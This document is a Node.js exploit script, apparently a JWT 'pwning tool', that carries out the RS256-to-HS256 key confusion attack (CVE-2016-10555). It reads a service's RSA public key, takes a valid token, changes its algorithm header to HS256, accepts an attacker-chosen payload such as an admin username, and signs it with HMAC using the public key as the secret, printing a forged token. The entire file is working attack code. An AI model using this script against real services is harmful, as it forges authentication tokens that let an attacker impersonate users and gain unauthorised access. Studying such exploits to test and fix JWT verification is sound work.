var jwt = require('jwt-simple');
var fs = require('fs');
var path = require('path');
var colors = require('colors');

const readline = require('readline');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const it = rl[Symbol.asyncIterator]();

let JWT_PUB = fs.readFileSync(path.normalize(__dirname + '/../../user-auth-service/keys/jwtRS256.key.pub'));
let REAL_VALID_TOKEN = '';
let EVIL_PAYLOAD = '';

async function main() {
    // read in valid token
    console.log('[*] Type in a valid token generated by the application: ');
    REAL_VALID_TOKEN = (await it.next()).value;

    console.log("[-] Start pwning ....");
    b64Header = REAL_VALID_TOKEN.split(".")[0];
    b64Payload = REAL_VALID_TOKEN.split(".")[1];

    let headerBuff = new Buffer(b64Header, 'base64');
    let payloadBuff = new Buffer(b64Payload, 'base64');

    let header = JSON.parse(headerBuff.toString('ascii'));
    console.log(colors.bold.yellow("[-] [TOKEN-HEADER]: " + JSON.stringify(header)));

    if (header.alg !== "RS256") {
        console.log(colors.red("Invalid token, has to be an RS256 token."));
        return;
    }

    console.log("[-] Pwn header to HS256 ...");
    header.alg = "HS256";

    let payload = JSON.parse(payloadBuff.toString('ascii'));
    console.log(colors.bold.yellow("[-] [TOKEN-PAYLOAD]: " + JSON.stringify(payload)));

    console.log('[-] Example: {"username": "admin", "userid": 99}');
    console.log('[*] Type in your evil payload:');
    EVIL_PAYLOAD = JSON.parse((await it.next()).value);

    console.log("[-] [PWNING]: Modifying header and payload ...");

    // create header and payload as base64
    headerNpayload = Buffer.from(JSON.stringify(header)).toString('base64') + "." + Buffer.from(JSON.stringify(EVIL_PAYLOAD)).toString('base64');

    // remove '=' padding of base64 strings
    headerNpayload = headerNpayload.split(".").map(it => it.substr(0, (it).length - it.match('=*$')[0].length)).join(".");

    verifySig = require("crypto").createHmac("sha256", JWT_PUB).update(headerNpayload).digest('base64');
    verifySig = verifySig.split('/').join('_').split('+').join('-');

    // remove '=' padding of verifySignature
    verifySig = verifySig.substr(0, (verifySig).length - verifySig.match('=*$')[0].length);

    // create pwned token
    pwned_token = headerNpayload + "." + verifySig;

    console.log(colors.bold.yellow("[-] Generated token:"));
    console.log(colors.bold.yellow(pwned_token));
}

function printBanner() {
    console.log(colors.bold.grey("=============================================================\n" +
        "######  ######  #######    #    #    # #######   #   #     # \n" +
        "#     # #     # #     #   # #   #   #     #     ##   #     # \n" +
        "#     # #     # #     #  #   #  #  #      #    # #   #     # \n" +
        "######  #     # #     # #     # ###       #      #   #     # \n" +
        "#   #   #     # #     # ####### #  #      #      #    #   #  \n" +
        "#    #  #     # #     # #     # #   #     #      #     # #   \n" +
        "#     # ######  ####### #     # #    #    #    #####    #    \n" +
        "============================================================="));
    console.log(colors.bold.yellow("Pwning tool for JWT tokens. \n" +
        "[KeyConfusionAttack] CVE-2016â€“10555" +
        "                                                             \n"));
}

if (require.main === module) {
    printBanner();
    main();
}
